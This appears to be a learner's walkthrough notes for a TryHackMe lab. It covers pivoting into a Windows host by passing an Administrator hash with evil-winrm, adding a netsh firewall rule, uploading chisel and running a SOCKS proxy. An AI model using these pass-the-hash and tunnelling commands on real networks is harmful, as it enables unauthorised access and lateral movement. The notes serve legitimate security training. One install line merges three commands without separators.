We found two ports open in the previous task. RDP won't be of much use to us without credentials (or at least a hash, although Pass-the-Hash attacks are often restricted through RDP anyway); however, the webserver is worth looking into. Wreath told us that he worked on his website using a local environment on his own PC, so this bleeding-edge version may contain some vulnerabilities that we could use to exploit the target. Before we can do that, however, we must figure out how to access the development webserver on Wreath's PC from our attacking machine.

We have two immediate options for this: *Chisel*, and *Plink*.

If you followed the recommended route of using sshuttle to pivot from the webserver then a _chisel forward proxy_ is recommended here as it will be relatively easy to connect to through the sshuttle connection without requiring a relay -- look back at the Chisel task if you need help with this!

When using this option you will need to open up a port in the Windows firewall to allow the forward connection to be made. The syntax for opening a port using `netsh` looks something like this:  
`netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`

Please use the `name-USERNAME` naming convention -- for example:  
`netsh advfirewall firewall add rule name="Chisel-MuirlandOracle" dir=in action=allow protocol=tcp localport=47000`  
![Demonstration of the above firewall rule through WinRM](https://assets.tryhackme.com/additional/wreath-network/31589c0e89b3.png)

Whether you choose the recommended option or not, get a pivot up and running!

# Your job

1. Open up a port for pivoting. #Evil-WinRM_shell 
```
netsh advfirewall firewall add rule name="Kairos" dir=in action=allow protocol=tcp localport=47000
```

2. For pivoting, we can use chisel. Run evil-winrm . #Attacking_Machine 
```
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s <chisel_windows.exe directory>
```

3. Download  it from https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz/. #Attacking_Machine 

4. Decompress the .gz file. #Attacking_Machine 

5. Upload the chisel.exe file in #Evil-WinRM_shell  session.
```
upload chisel.exe
```

6. Setup chisel server forward socks proxy on #Evil-WinRM_shell 
```
chisel.exe server -p 49337 --socks5
```

7. Install chisel on Kali Linux.
	1. **Download Chisel Binary**
	    
	    - Visit the official [Chisel GitHub releases page](https://github.com/jpillora/chisel/releases).
	    - Identify the latest version and download the Linux binary:
	        `wget https://github.com/jpillora/chisel/releases/download/v1.9.0/chisel_1.9.0_linux_amd64.gz`
	        
	2. **Uncompress the Binary**
	    
	    - Use `gzip` to extract the file:
	        `gunzip chisel_1.9.0_linux_amd64.gz mv chisel_1.9.0_linux_amd64 chisel chmod +x chisel`
	        
	3. **Move Binary to System Path**
	    
	    - Place it in `/usr/local/bin` so it can be accessed globally:
	        `sudo mv chisel /usr/local/bin`
	        
	4. **Verify Installation**
	    
	    - Check if Chisel is installed correctly:
	        
	        `chisel --help`

8. Run chisel client. #Attacking_Machine 
```
chisel client 10.200.84.150:49337 9090:socks
```

Now the socks proxy is opened on port 9090 of our port

